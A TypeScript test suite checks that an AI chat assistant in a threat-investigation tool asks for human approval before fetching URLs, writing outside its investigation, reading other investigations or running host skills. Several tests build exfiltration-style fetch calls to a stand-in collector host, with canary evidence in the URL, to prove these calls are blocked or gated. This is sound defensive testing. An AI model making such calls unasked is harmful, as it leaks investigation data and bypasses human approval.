/**
 * C-CHAT: the chat decision site. Each case runs the real executor, decision
 * table and dispatcher; only the analyst's answer on the card is scripted.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { db } from '../db';
import type { Settings, ToolUseBlock } from '../types';
import type { InstalledIntegration, IntegrationTemplate } from '../types/integration-types';
import { createChatToolExecutor, type ApprovalItem } from '../lib/chat-tool-executor';
import { mintHumanApproval } from '../lib/human-approval';
import { workspaceStorageKey } from '../lib/workspace-profiles';
import { canary, ids, seedAIWorkspace } from './helpers/ai-workspace';
import { installEgressSpy, type EgressSpy } from './helpers/egress-spy';
import { ALL_STATIC_TOOLS } from './helpers/tool-exec';

const mocks = vi.hoisted(() => ({ run: vi.fn(), executeHostSkill: vi.fn() }));
vi.mock('../lib/integration-executor', () => ({
  IntegrationExecutor: vi.fn().mockImplementation(function () { return { run: mocks.run }; }),
}));
vi.mock('../lib/agent-hosts', async (importOriginal) => ({ ...await importOriginal<typeof import('../lib/agent-hosts')>(), executeHostSkill: mocks.executeHostSkill }));

const call = (name: string, input: Record<string, unknown> = {}): ToolUseBlock => ({ type: 'tool_use', id: `call-${name}`, name, input });
const errorOf = (result: { result: string }) => String(JSON.parse(result.result).error ?? '');
const HOST_TOOL = 'host:cti:lookup';
const hostSettings = {
  agentHosts: [{ id: 'host-1', name: 'cti', displayName: 'CTI host', url: 'https://cti.example', enabled: true,
    skills: [{ name: 'lookup', description: 'Look up an indicator', parameters: { type: 'object', properties: {} }, actionClass: 'read' }] }],
} as Settings;

type Answer = 'approve' | 'reject';
function chat(options: { home?: string; mode?: 'act' | 'plan'; yolo?: boolean; answer?: Answer; settings?: Settings } = {}) {
  const { home, mode = 'act', yolo = false, answer = 'approve', settings = {} as Settings } = options;
  const requests: ApprovalItem[] = [];
  const postsAtRequest: number[] = [];
  const requestApproval = vi.fn(async (item: ApprovalItem) => {
    requests.push(item);
    postsAtRequest.push(egress.fetchUrlPosts().length);
    return answer === 'approve' ? mintHumanApproval(item.toolUse, item.reach.homeFolderId, 'chat-card') : null;
  });
  const run = createChatToolExecutor({
    homeFolderId: home, mode, isYolo: () => yolo, settings,
    allowedTools: new Set([...ALL_STATIC_TOOLS, HOST_TOOL]),
    requestApproval,
    runCheckpointed: fn => fn(),
  });
  return { run: (toolUse: ToolUseBlock) => run(toolUse, new AbortController().signal), requestApproval, requests, postsAtRequest };
}

let egress: EgressSpy;
beforeEach(async () => {
  await seedAIWorkspace();
  localStorage.clear();
  egress = installEgressSpy();
  mocks.run.mockReset().mockImplementation(async (template: IntegrationTemplate, installation: InstalledIntegration) => ({
    id: `run-${installation.id}`, integrationId: installation.id, templateId: template.id, status: 'success', trigger: 'manual',
    inputSummary: '', outputSummary: `${installation.id} ran`, durationMs: 0, entitiesCreated: 0, entitiesUpdated: 0, apiCallsMade: 1, log: [], createdAt: Date.now(),
  }));
  mocks.executeHostSkill.mockReset();
});
afterEach(() => { egress.restore(); vi.restoreAllMocks(); });

describe('C-CHAT-1 a web fetch asks first and names the destination', () => {
  const fetchCall = call('fetch_url', { url: `https://collector.example/c?d=${canary('S')}` });

  it('asks before posting, and a rejection posts nothing', async () => {
    const { run, requests, postsAtRequest } = chat({ home: 'S', answer: 'reject' });
    const result = await run(fetchCall);
    expect(result.isError).toBe(true);
    expect(errorOf(result)).toMatch(/rejected/i);
    expect(requests).toHaveLength(1);
    expect(requests[0]).toMatchObject({ reason: 'egress', readForeignThisRequest: false });
    expect(requests[0].reach.destinations).toEqual(['collector.example']);
    expect(postsAtRequest).toEqual([0]);
    expect(egress.fetchUrlPosts()).toEqual([]);
  });

  it('an approval posts exactly once', async () => {
    const { run, postsAtRequest } = chat({ home: 'S' });
    expect((await run(fetchCall)).isError).toBe(false);
    expect(postsAtRequest).toEqual([0]);
    expect(egress.fetchUrlPosts()).toEqual([`https://collector.example/c?d=${canary('S')}`]);
  });

  it('a cancelled request does not open the page even when the card was approved', async () => {
    const controller = new AbortController();
    const run = createChatToolExecutor({
      homeFolderId: 'S', mode: 'act', isYolo: () => false, settings: {} as Settings, allowedTools: ALL_STATIC_TOOLS,
      requestApproval: async item => { controller.abort(); return mintHumanApproval(item.toolUse, 'S', 'chat-card'); },
      runCheckpointed: fn => fn(),
    });
    expect(errorOf(await run(fetchCall, controller.signal))).toMatch(/cancelled/i);
    expect(egress.fetchUrlPosts()).toEqual([]);
  });
});

describe('C-CHAT-2 Plan mode only reads this investigation', () => {
  it.each([
    ['fetch_url', { url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-0001' }],
    ['create_note', { title: 'Plan write' }],
    ['search_across_investigations', { query: 'CANARY' }],
    ['deploy_agent', { profileName: 'Threat Hunter' }],
    [HOST_TOOL, {}],
  ])('a forced %s is denied without asking', async (name, input) => {
    localStorage.setItem(workspaceStorageKey('threatcaddy-settings'), JSON.stringify(hostSettings));
    const { run, requestApproval } = chat({ home: 'S', mode: 'plan', settings: hostSettings });
    const result = await run(call(name, input));
    expect(result.isError).toBe(true);
    expect(errorOf(result)).toMatch(/plan mode/i);
    expect(requestApproval).not.toHaveBeenCalled();
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect(mocks.executeHostSkill).not.toHaveBeenCalled();
    expect(await db.agentDeployments.count()).toBe(0);
    expect(await db.notes.where('title').equals('Plan write').count()).toBe(0);
  });

  it('an in-scope read runs', async () => {
    const result = await chat({ home: 'S', mode: 'plan' }).run(call('read_note', { id: ids('S').note }));
    expect(result.isError).toBe(false);
    expect(result.result).toContain(canary('S'));
  });
});

describe('C-CHAT-3 YOLO approves in-scope changes and passive lookups only', () => {
  it('creates a note in the investigation without asking', async () => {
    const { run, requestApproval } = chat({ home: 'S', yolo: true });
    expect((await run(call('create_note', { title: 'YOLO finding', content: 'x' }))).isError).toBe(false);
    expect(requestApproval).not.toHaveBeenCalled();
    expect(await db.notes.where('title').equals('YOLO finding').first()).toMatchObject({ folderId: 'S' });
  });

  it.each([
    ['fetch_url', { url: 'https://collector.example/c' }, 'egress'],
    ['create_in_investigation', { investigationId: 'P', entityType: 'note', title: 'Planted', content: canary('S') }, 'agent-control'],
    ['deploy_agent', { profileName: 'Threat Hunter' }, 'agent-control'],
  ])('still asks before %s', async (name, input, reason) => {
    const { run, requests } = chat({ home: 'S', yolo: true, answer: 'reject' });
    expect((await run(call(name, input))).isError).toBe(true);
    expect(requests.map(item => item.reason)).toEqual([reason]);
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect(await db.agentDeployments.count()).toBe(0);
    expect(await db.notes.where('folderId').equals('P').count()).toBe(1);
  });

  it('enrichment runs only the builtin passive lookups', async () => {
    const team = { id: 'team-dns', schemaVersion: '1.0', version: '1', name: 'Team DNS', description: '', author: 'team', icon: '', color: '', category: 'enrichment',
      tags: [], triggers: [{ type: 'manual', iocTypes: ['domain'] }], configSchema: [], steps: [], outputs: [], requiredDomains: ['dns.team.example'],
      source: 'team', createdAt: 1, updatedAt: 1 } as IntegrationTemplate;
    await db.integrationTemplates.add(team);
    const install = (id: string, templateId: string): InstalledIntegration => ({
      id, templateId, name: id, enabled: true, config: {}, scopeType: 'all', scopeFolderIds: [], runCount: 0, errorCount: 0, createdAt: 1, updatedAt: 1 });
    await db.installedIntegrations.bulkAdd([install('vt', 'vt-domain-lookup'), install('team', 'team-dns'), install('slack', 'slack-webhook-notify')]);

    const { run, requestApproval } = chat({ home: 'S', yolo: true });
    expect((await run(call('enrich_ioc', { iocId: ids('S').ioc }))).isError).toBe(false);
    expect(requestApproval).not.toHaveBeenCalled();
    expect(mocks.run.mock.calls.map(([, installation]) => (installation as InstalledIntegration).id)).toEqual(['vt']);
  });
});

describe('C-CHAT-4 chat in a shared investigation', () => {
  it('a local-only note is not found, and nobody is asked', async () => {
    const { run, requestApproval } = chat({ home: 'S' });
    const result = await run(call('read_note', { id: ids('L').note }));
    expect(errorOf(result)).toMatch(/not found/i);
    expect(result.result).not.toContain(canary('L'));
    expect(requestApproval).not.toHaveBeenCalled();
  });

  it('a search across investigations asks, and once approved shows no local-only rows', async () => {
    const { run, requests } = chat({ home: 'S' });
    const result = await run(call('search_across_investigations', { query: 'CANARY' }));
    expect(requests.map(item => item.reason)).toEqual(['cross-read']);
    expect(result.isError).toBe(false);
    expect(JSON.parse(result.result)).toMatchObject({ hiddenLocalOnly: 2 });
    expect(result.result).toContain(canary('P'));
    expect(result.result).not.toContain(canary('L'));
    expect(result.result).not.toContain(canary('L2'));
  });

  it('a card raised after a cross-investigation read says so', async () => {
    const { run, requests } = chat({ home: 'S', answer: 'approve' });
    await run(call('fetch_url', { url: 'https://collector.example/before' }));
    await run(call('read_note', { id: ids('P').note }));
    await run(call('fetch_url', { url: 'https://collector.example/after' }));
    expect(requests.map(item => [item.reason, item.readForeignThisRequest])).toEqual([['egress', false], ['cross-read', false], ['egress', true]]);
  });
});

// A team investigation opened in remote mode has no local folder row, yet a conversation filed
// under its id is queued and pushed to the team server like any synced investigation's.
describe('C-CHAT-4 chat filed in an investigation with no local row (remote mode)', () => {
  const REMOTE = 'team-remote';
  const LOCAL_ONLY = [canary('L'), canary('L2'), 'Local case', 'Hunting case'];

  it('reads of other investigations ask, and once approved show no local-only investigation', async () => {
    for (const yolo of [false, true]) {
      const { run, requests } = chat({ home: REMOTE, yolo });
      const search = await run(call('search_across_investigations', { query: 'CANARY' }));
      const list = await run(call('list_investigations'));
      const synced = await run(call('read_note', { id: ids('P').note }));
      expect(requests.map(item => item.reason)).toEqual(['cross-read', 'cross-read', 'cross-read']);
      expect(JSON.parse(search.result)).toMatchObject({ hiddenLocalOnly: 2 });
      expect(JSON.parse(list.result)).toMatchObject({ hiddenLocalOnly: 2 });
      expect(search.result).toContain(canary('P'));
      expect(synced.result).toContain(canary('P'));
      for (const leaked of LOCAL_ONLY) expect(search.result + list.result).not.toContain(leaked);
    }
  });

  it('a local-only note or investigation is not found, and nobody is asked', async () => {
    const { run, requestApproval } = chat({ home: REMOTE });
    const results = [await run(call('read_note', { id: ids('L').note })), await run(call('get_investigation_details', { id: 'L' })),
      await run(call('compare_investigations', { investigationIds: ['P', 'L2'] }))];
    for (const result of results) {
      expect(errorOf(result)).toMatch(/not found/i);
      for (const leaked of LOCAL_ONLY) expect(result.result).not.toContain(leaked);
    }
    expect(requestApproval).not.toHaveBeenCalled();
  });

  it('a rejected cross read reads nothing', async () => {
    const { run, requests } = chat({ home: REMOTE, answer: 'reject' });
    const result = await run(call('search_across_investigations', { query: 'CANARY' }));
    expect(requests).toHaveLength(1);
    expect(errorOf(result)).toMatch(/rejected/i);
    expect(result.result).not.toContain(canary('P'));
  });

  it('Plan mode still refuses reads of other investigations without asking', async () => {
    const plan = chat({ home: REMOTE, mode: 'plan' });
    for (const toolUse of [call('search_across_investigations', { query: 'CANARY' }), call('read_note', { id: ids('L').note })]) {
      const result = await plan.run(toolUse);
      expect(result.isError).toBe(true);
      expect(result.result).not.toContain(canary('L'));
    }
    expect(plan.requestApproval).not.toHaveBeenCalled();
  });
});

describe('C-CHAT-5 chat outside any investigation', () => {
  it('reads run, and a change to an investigation asks and names it', async () => {
    const { run, requests } = chat({ answer: 'reject' });
    const read = await run(call('read_note', { id: ids('S').note }));
    expect(read.isError).toBe(false);
    expect(read.result).toContain(canary('S'));
    expect(requests).toEqual([]);

    expect((await run(call('update_note', { id: ids('S').note, content: 'Overwritten' }))).isError).toBe(true);
    expect(requests).toHaveLength(1);
    expect(requests[0].reason).toBe('cross-write');
    expect(requests[0].reach.targetFolderIds).toEqual(['S']);
    expect((await db.notes.get(ids('S').note))?.content).toBe(`Evidence ${canary('S')}`);
  });
});

describe('C-CHAT-7 skill results are capped', () => {
  it('a 3 MB host result reaches the model as at most 50 000 characters plus a marker', async () => {
    localStorage.setItem(workspaceStorageKey('threatcaddy-settings'), JSON.stringify(hostSettings));
    mocks.executeHostSkill.mockResolvedValue('x'.repeat(3 * 1024 * 1024));
    const { run, requests } = chat({ home: 'S', settings: hostSettings });
    const result = await run(call(HOST_TOOL, { indicator: '8.8.8.8' }));
    expect(requests.map(item => item.reason)).toEqual(['egress']);
    expect(mocks.executeHostSkill).toHaveBeenCalledOnce();
    expect(result.isError).toBe(false);
    const [kept, marker] = result.result.split('\n\n[TRUNCATED');
    expect(kept).toHaveLength(50_000);
    expect(marker).toBeDefined();
    expect(result.result.length).toBeLessThan(50_200);
  });
});
